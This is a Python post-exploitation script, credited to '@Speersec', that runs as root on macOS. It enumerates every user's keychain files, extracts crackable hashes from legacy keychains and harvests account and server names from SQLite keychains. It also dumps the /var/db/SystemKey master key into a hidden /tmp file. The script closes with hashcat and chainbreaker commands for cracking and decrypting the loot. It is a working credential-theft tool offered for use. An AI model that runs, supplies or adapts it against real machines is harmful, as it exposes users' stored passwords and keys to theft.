#!/usr/bin/env python3
"""
Keychain Recon and Hash Extraction - @Speersec
Runs as root. No user password needed. SIP can be enabled.
"""

import os
import sys
import glob
import sqlite3
import struct
import hashlib
import subprocess
import json
from binascii import hexlify
from pathlib import Path
from datetime import datetime


# ─────────────────────────────────────────────────────────
# Keychain file discovery
# ─────────────────────────────────────────────────────────

def find_keychain_files() -> list[dict]:
    """Locate all keychain files on the system."""
    results = []
    search_paths = [
        "/Library/Keychains/System.keychain",
        "/Library/Keychains/System.keychain-db",
    ]

    # Find all user home directories
    users_dir = Path("/Users")
    if users_dir.exists():
        for user_dir in users_dir.iterdir():
            if user_dir.is_dir() and user_dir.name not in ('.', '..', 'Shared'):
                kc_dir = user_dir / "Library" / "Keychains"
                search_paths.append(str(kc_dir / "login.keychain"))
                search_paths.append(str(kc_dir / "login.keychain-db"))
                # Also glob for any other keychain files in the directory
                if kc_dir.exists():
                    for f in kc_dir.iterdir():
                        path_str = str(f)
                        if path_str.endswith(('.keychain', '.keychain-db')):
                            if path_str not in search_paths:
                                search_paths.append(path_str)

    for path in search_paths:
        if os.path.exists(path):
            try:
                size = os.path.getsize(path)
                with open(path, 'rb') as f:
                    header = f.read(16)

                kc_format = identify_format(header)
                results.append({
                    'path': path,
                    'size': size,
                    'format': kc_format,
                    'header_hex': hexlify(header[:8]).decode('ascii'),
                    'owner': get_file_owner(path),
                })
            except (PermissionError, OSError) as e:
                results.append({
                    'path': path,
                    'size': -1,
                    'format': 'ACCESS_DENIED',
                    'header_hex': '',
                    'owner': '',
                    'error': str(e),
                })
    return results


def identify_format(header: bytes) -> str:
    """Determine keychain file format from the header bytes."""
    if len(header) < 4:
        return 'UNKNOWN_TOO_SHORT'
    if header[:4] == b'kych':
        return 'LEGACY_BINARY'
    if header[:6] == b'SQLite' or header[:16].startswith(b'SQLite format 3'):
        return 'SQLITE_DB'
    return 'UNKNOWN'


def get_file_owner(path: str) -> str:
    """Get file owner as user:group."""
    try:
        import pwd
        import grp
        stat = os.stat(path)
        user = pwd.getpwuid(stat.st_uid).pw_name
        group = grp.getgrgid(stat.st_gid).gr_name
        return f"{user}:{group}"
    except Exception:
        return "unknown"


# ─────────────────────────────────────────────────────────
# Legacy binary keychain hash extraction
# ─────────────────────────────────────────────────────────

def extract_legacy_hash(path: str) -> dict | None:
    """
    Extract the crackable password hash from a legacy .keychain file.
    Output format is compatible with hashcat mode 23100.
    """
    try:
        with open(path, 'rb') as f:
            kc_buffer = f.read()

        if len(kc_buffer) < 20:
            return None

        # Parse the APPL_DB_HEADER: > 4s i i i i (20 bytes)
        sig, version, header_size, schema_offset, auth_offset = struct.unpack(
            '> 4s i i i i', kc_buffer[:20]
        )

        if sig != b'kych':
            return None

        # Parse schema to find table list
        schema_size, table_count = struct.unpack(
            '> i i', kc_buffer[schema_offset:schema_offset + 8]
        )

        # Read table offsets
        table_list = []
        base = 20 + 8  # APPL_DB_HEADER size + APPL_DB_SCHEMA size
        for i in range(table_count):
            offset = struct.unpack(
                '>I', kc_buffer[base + (4 * i):base + (4 * i) + 4]
            )[0]
            table_list.append(offset)

        # Find the metadata table (TableId == 0x80008000)
        metadata_table_idx = None
        for idx, tbl_offset in enumerate(table_list):
            tbl_base = 20 + tbl_offset
            if tbl_base + 28 > len(kc_buffer):
                continue
            _tbl_size, table_id = struct.unpack(
                '>I I', kc_buffer[tbl_base:tbl_base + 8]
            )
            if table_id == 0x80008000:
                metadata_table_idx = idx
                break

        if metadata_table_idx is None:
            return {'error': 'Could not find metadata table'}

        # DB blob is at: header_size + symmetric_key_offset + 0x38
        sym_offset = table_list[metadata_table_idx]
        blob_addr = 20 + sym_offset + 0x38

        # Parse DB_BLOB: > 8s I I 16s I 8s 20s 8s 20s
        db_blob_size = struct.calcsize('> 8s I I 16s I 8s 20s 8s 20s')
        if blob_addr + db_blob_size > len(kc_buffer):
            return {'error': 'DB blob extends past end of file'}

        (common_blob, start_crypto, total_length, rand_sig, sequence,
         params, salt, iv, blob_sig) = struct.unpack(
            '> 8s I I 16s I 8s 20s 8s 20s',
            kc_buffer[blob_addr:blob_addr + db_blob_size]
        )

        # Extract the ciphertext
        ciphertext = kc_buffer[
            blob_addr + start_crypto:blob_addr + total_length
        ]

        salt_hex = hexlify(salt).decode('ascii')
        iv_hex = hexlify(iv).decode('ascii')
        ct_hex = hexlify(ciphertext).decode('ascii')

        hashcat_hash = f"$keychain$*{salt_hex}*{iv_hex}*{ct_hex}"

        return {
            'path': path,
            'hashcat_mode': 23100,
            'hash': hashcat_hash,
            'salt_hex': salt_hex,
            'iv_hex': iv_hex,
            'ciphertext_length': len(ciphertext),
        }

    except Exception as e:
        return {'path': path, 'error': str(e)}


# ─────────────────────────────────────────────────────────
# SQLite keychain metadata extraction
# ─────────────────────────────────────────────────────────

def extract_sqlite_metadata(path: str) -> dict:
    """
    Extract unencrypted metadata from a .keychain-db SQLite file.
    This does NOT extract passwords (they are encrypted), but it
    pulls account names, services, servers, and other cleartext
    fields that are stored outside the encrypted blob.
    """
    result = {
        'path': path,
        'tables': [],
        'generic_passwords': [],
        'internet_passwords': [],
        'certificates': [],
        'keys': [],
    }

    try:
        # Connect read-only to avoid any writes
        conn = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        # List all tables
        cursor.execute(
            "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name"
        )
        result['tables'] = [row['name'] for row in cursor.fetchall()]

        # Try to extract generic password metadata
        # Table structure varies by macOS version
        for table_name in ['genp', 'inet', 'cert', 'keys']:
            try:
                cursor.execute(f"PRAGMA table_info({table_name})")
                columns = [row['name'] for row in cursor.fetchall()]

                if not columns:
                    continue

                # Fetch all rows but only keep non-blob, non-encrypted columns
                safe_columns = [
                    c for c in columns
                    if c.lower() not in ('data', 'v_data', 'rowid')
                ]

                if not safe_columns:
                    continue

                col_str = ', '.join(safe_columns)
                cursor.execute(f"SELECT {col_str} FROM {table_name}")
                rows = cursor.fetchall()

                entries = []
                for row in rows:
                    entry = {}
                    for col in safe_columns:
                        val = row[col]
                        if isinstance(val, bytes):
                            # Try to decode as UTF-8, fall back to hex
                            try:
                                decoded = val.decode('utf-8')
                                if all(c in __import__('string').printable for c in decoded):
                                    entry[col] = decoded
                                else:
                                    entry[col] = f"<bytes:{len(val)}>"
                            except UnicodeDecodeError:
                                entry[col] = f"<bytes:{len(val)}>"
                        elif val is not None:
                            entry[col] = val
                    entries.append(entry)

                if table_name == 'genp':
                    result['generic_passwords'] = entries
                elif table_name == 'inet':
                    result['internet_passwords'] = entries
                elif table_name == 'cert':
                    result['certificates'] = entries
                elif table_name == 'keys':
                    result['keys'] = entries

            except sqlite3.OperationalError:
                continue

        conn.close()

    except sqlite3.OperationalError as e:
        result['error'] = str(e)
    except Exception as e:
        result['error'] = str(e)

    return result


# ─────────────────────────────────────────────────────────
# SystemKey extraction
# ─────────────────────────────────────────────────────────

def extract_system_key() -> dict:
    """
    Attempt to read /var/db/SystemKey and extract the master key
    bytes at the known offset (skip 8-byte header, read 24 bytes).
    """
    systemkey_path = "/var/db/SystemKey"
    result = {'path': systemkey_path}

    if not os.path.exists(systemkey_path):
        result['error'] = 'File does not exist'
        return result

    try:
        with open(systemkey_path, 'rb') as f:
            data = f.read()

        result['file_size'] = len(data)
        result['full_hex'] = hexlify(data).decode('ascii')

        if len(data) >= 32:
            # Classic format: 8-byte header, 24-byte master key, 16-byte sig
            key_classic = data[8:32]
            result['master_key_classic'] = hexlify(key_classic).decode('ascii')
            result['header_hex'] = hexlify(data[:8]).decode('ascii')

            if len(data) >= 48:
                result['signature_hex'] = hexlify(data[32:48]).decode('ascii')
                result['format_likely'] = 'CLASSIC_48_BYTE'
            else:
                result['format_likely'] = f'NON_STANDARD_{len(data)}_BYTES'

            # Check the common blob magic (0xFADE0711)
            if len(data) >= 4:
                magic = struct.unpack('>I', data[:4])[0]
                result['magic'] = f"0x{magic:08X}"
                if magic == 0xFADE0711:
                    result['magic_valid'] = True
                else:
                    result['magic_valid'] = False
        else:
            result['error'] = f'File too short ({len(data)} bytes)'

    except PermissionError:
        result['error'] = 'Permission denied (SIP may be blocking access)'
    except OSError as e:
        result['error'] = str(e)

    return result


# ─────────────────────────────────────────────────────────
# Process recon
# ─────────────────────────────────────────────────────────

def check_securityd() -> dict:
    """Check securityd process status and basic session info."""
    result = {}
    try:
        ps_output = subprocess.check_output(
            ['ps', 'aux'], text=True, timeout=5
        )
        for line in ps_output.splitlines():
            if 'securityd' in line and 'grep' not in line:
                result['securityd_running'] = True
                result['securityd_line'] = line.strip()
                break
        else:
            result['securityd_running'] = False

        # Check SIP status
        try:
            csrutil = subprocess.check_output(
                ['csrutil', 'status'], text=True, timeout=5
            ).strip()
            result['sip_status'] = csrutil
        except (subprocess.SubprocessError, FileNotFoundError):
            result['sip_status'] = 'unknown'

        # Check who is logged in (for session context)
        try:
            who_output = subprocess.check_output(
                ['who'], text=True, timeout=5
            ).strip()
            result['logged_in_users'] = who_output.splitlines()
        except subprocess.SubprocessError:
            result['logged_in_users'] = []

        # Check macOS version
        try:
            sw_vers = subprocess.check_output(
                ['sw_vers'], text=True, timeout=5
            ).strip()
            result['os_version'] = sw_vers
        except subprocess.SubprocessError:
            result['os_version'] = 'unknown'

    except Exception as e:
        result['error'] = str(e)

    return result


# ─────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────

def main():
    if os.geteuid() != 0:
        print("[!] This script should be run as root for full access.")
        print("[!] Continuing anyway, but some paths may be inaccessible.\n")

    output = {
        'timestamp': datetime.now().isoformat(),
        'hostname': os.uname().nodename,
        'uid': os.geteuid(),
    }

    # Phase 1: System recon
    print("[*] Phase 1: System recon...")
    output['system'] = check_securityd()

    # Phase 2: Find all keychain files
    print("[*] Phase 2: Enumerating keychain files...")
    keychains = find_keychain_files()
    output['keychains'] = keychains

    for kc in keychains:
        fmt = kc.get('format', 'UNKNOWN')
        print(f"    [{fmt}] {kc['path']} ({kc.get('size', '?')} bytes, {kc.get('owner', '?')})")

    # Phase 3: Extract hashes from legacy keychains
    print("[*] Phase 3: Extracting hashes from legacy keychains...")
    hashes = []
    for kc in keychains:
        if kc.get('format') == 'LEGACY_BINARY':
            h = extract_legacy_hash(kc['path'])
            if h:
                hashes.append(h)
                if 'hash' in h:
                    print(f"    [+] Hash extracted: {kc['path']}")
                    print(f"        {h['hash']}")
                else:
                    print(f"    [-] Failed: {kc['path']} - {h.get('error', 'unknown')}")
    output['hashes'] = hashes

    if not hashes:
        print("    [-] No legacy keychains found. All may be SQLite format.")

    # Phase 4: Extract metadata from SQLite keychains
    print("[*] Phase 4: Extracting metadata from SQLite keychains...")
    sqlite_results = []
    for kc in keychains:
        if kc.get('format') == 'SQLITE_DB':
            meta = extract_sqlite_metadata(kc['path'])
            sqlite_results.append(meta)
            gp_count = len(meta.get('generic_passwords', []))
            ip_count = len(meta.get('internet_passwords', []))
            cert_count = len(meta.get('certificates', []))
            print(f"    [+] {kc['path']}: {gp_count} generic, {ip_count} internet, {cert_count} certs")

            # Print some useful metadata
            for gp in meta.get('generic_passwords', [])[:10]:
                acct = gp.get('acct', gp.get('account', ''))
                svce = gp.get('svce', gp.get('service', ''))
                agrp = gp.get('agrp', gp.get('access_group', ''))
                if acct or svce:
                    print(f"        genp: acct={acct} svce={svce} agrp={agrp}")

            for ip in meta.get('internet_passwords', [])[:10]:
                acct = ip.get('acct', ip.get('account', ''))
                srvr = ip.get('srvr', ip.get('server', ''))
                ptcl = ip.get('ptcl', ip.get('protocol', ''))
                if acct or srvr:
                    print(f"        inet: acct={acct} srvr={srvr} ptcl={ptcl}")

    output['sqlite_metadata'] = sqlite_results

    # Phase 5: SystemKey extraction
    print("[*] Phase 5: Attempting SystemKey extraction...")
    syskey = extract_system_key()
    output['system_key'] = syskey

    if 'master_key_classic' in syskey:
        print(f"    [+] SystemKey extracted: {syskey['master_key_classic']}")
        print(f"    [+] Magic: {syskey.get('magic', '?')} (valid: {syskey.get('magic_valid', '?')})")
        print(f"    [+] Format: {syskey.get('format_likely', '?')}")
        print(f"    [i] Use with chainbreaker: --key {syskey['master_key_classic']}")
    elif 'error' in syskey:
        print(f"    [-] SystemKey: {syskey['error']}")

    # Write full output to JSON
    output_path = "/tmp/.kc_recon.json"
    try:
        with open(output_path, 'w') as f:
            json.dump(output, f, indent=2, default=str)
        os.chmod(output_path, 0o600)
        print(f"\n[*] Full output written to {output_path}")
    except OSError as e:
        print(f"\n[!] Could not write output file: {e}")
        print(json.dumps(output, indent=2, default=str))

    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    legacy_count = sum(1 for kc in keychains if kc.get('format') == 'LEGACY_BINARY')
    sqlite_count = sum(1 for kc in keychains if kc.get('format') == 'SQLITE_DB')

    print(f"  Keychains found:  {len(keychains)} ({legacy_count} legacy, {sqlite_count} SQLite)")
    print(f"  Hashes extracted: {len([h for h in hashes if 'hash' in h])}")

    total_gp = sum(len(s.get('generic_passwords', [])) for s in sqlite_results)
    total_ip = sum(len(s.get('internet_passwords', [])) for s in sqlite_results)
    print(f"  SQLite metadata:  {total_gp} generic passwords, {total_ip} internet passwords")

    if syskey.get('master_key_classic'):
        print(f"  SystemKey:        EXTRACTED")
    else:
        print(f"  SystemKey:        FAILED ({syskey.get('error', 'unknown')})")

    # Recommendations
    print("\nNEXT STEPS:")
    if hashes:
        print("  [1] Crack legacy hashes with: hashcat -m 23100 --keep-guessing hashes.txt wordlist.txt")
    if syskey.get('master_key_classic') and legacy_count > 0:
        print(f"  [2] Try SystemKey against System.keychain:")
        print(f"      python3 chainbreaker.py --key {syskey['master_key_classic']} -a /Library/Keychains/System.keychain")
    if sqlite_count > 0 and legacy_count == 0:
        print("  [!] All keychains are SQLite format. Chainbreaker cannot parse these.")
        print("  [!] Options: crack the user password, or use keyring API from a GUI session.")
    print()


if __name__ == "__main__":
    main()
